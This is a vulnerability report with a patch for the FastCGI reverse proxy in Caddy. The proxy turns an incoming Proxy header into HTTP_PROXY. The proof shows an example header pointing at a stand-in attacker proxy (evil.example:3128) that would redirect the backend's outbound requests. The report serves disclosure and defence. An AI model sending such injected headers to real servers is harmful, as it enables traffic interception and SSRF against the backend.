# Proxy Header Exported As FastCGI HTTP_PROXY

## Classification

SSRF / proxy injection, medium severity.

## Affected Locations

`modules/caddyhttp/reverseproxy/fastcgi/fastcgi.go:412`

## Summary

The FastCGI reverse proxy exported every incoming HTTP request header into the CGI environment. An attacker-controlled `Proxy` request header was normalized into `HTTP_PROXY`, then passed to the FastCGI backend. If the backend application or runtime honors `HTTP_PROXY` for outbound HTTP requests, the attacker can force those requests through an attacker-controlled proxy.

## Provenance

Reported by Swival Security Scanner: https://swival.dev

Confidence: certain.

## Preconditions

- A remote attacker can send HTTP requests through the FastCGI reverse proxy.
- The request reaches FastCGI environment construction with a `Proxy` header still present.
- The FastCGI application, framework, language runtime, or outbound HTTP client honors `HTTP_PROXY`.

## Proof

`RoundTrip` calls `t.buildEnv(r)` before forwarding the request to FastCGI.

Inside `buildEnv`, every remaining request header was exported with this transformation:

```go
header := strings.ToUpper(field)
header = headerNameReplacer.Replace(header)
env["HTTP_"+header] = strings.Join(val, ", ")
```

Therefore:

```http
Proxy: http://evil.example:3128
```

became:

```text
HTTP_PROXY=http://evil.example:3128
```

The resulting `env` map was then passed into FastCGI request methods such as `client.Get`, `client.Post`, `client.Head`, and `client.Options`, making `HTTP_PROXY` visible to the backend as a FastCGI parameter.

A local FastCGI capture PoC confirmed that a request containing:

```http
Proxy: http://evil.example:3128
```

reached the backend with:

```text
HTTP_PROXY="http://evil.example:3128"
```

## Why This Is A Real Bug

`HTTP_PROXY` is a historically dangerous CGI environment variable because some runtimes and HTTP clients interpret it as an outbound proxy configuration. This is the known CGI `HTTP_PROXY` injection pattern: attacker-controlled request metadata is converted into process/request environment, then consumed by backend code making outbound requests.

The vulnerable behavior is deterministic. The header name `Proxy` is uppercased, normalized, prefixed with `HTTP_`, and stored as `HTTP_PROXY` without filtering. Under the stated backend precondition, this gives the remote client control over outbound proxy routing and enables SSRF-style traffic redirection.

## Fix Requirement

Do not export the incoming `Proxy` request header into the FastCGI CGI environment.

## Patch Rationale

The patch skips only the dangerous `Proxy` header during generic request-header-to-CGI-environment export:

```go
if strings.EqualFold(field, "Proxy") {
	continue
}
```

This prevents attacker input from becoming `HTTP_PROXY` while preserving normal export behavior for other request headers. `strings.EqualFold` handles case-insensitive HTTP header names correctly.

## Residual Risk

None

## Patch

```diff
diff --git a/modules/caddyhttp/reverseproxy/fastcgi/fastcgi.go b/modules/caddyhttp/reverseproxy/fastcgi/fastcgi.go
index c4279d9a..186a5f02 100644
--- a/modules/caddyhttp/reverseproxy/fastcgi/fastcgi.go
+++ b/modules/caddyhttp/reverseproxy/fastcgi/fastcgi.go
@@ -411,6 +411,9 @@ func (t Transport) buildEnv(r *http.Request) (envVars, error) {
 
 	// Add all HTTP headers to env variables
 	for field, val := range r.Header {
+		if strings.EqualFold(field, "Proxy") {
+			continue
+		}
 		header := strings.ToUpper(field)
 		header = headerNameReplacer.Replace(header)
 		env["HTTP_"+header] = strings.Join(val, ", ")
```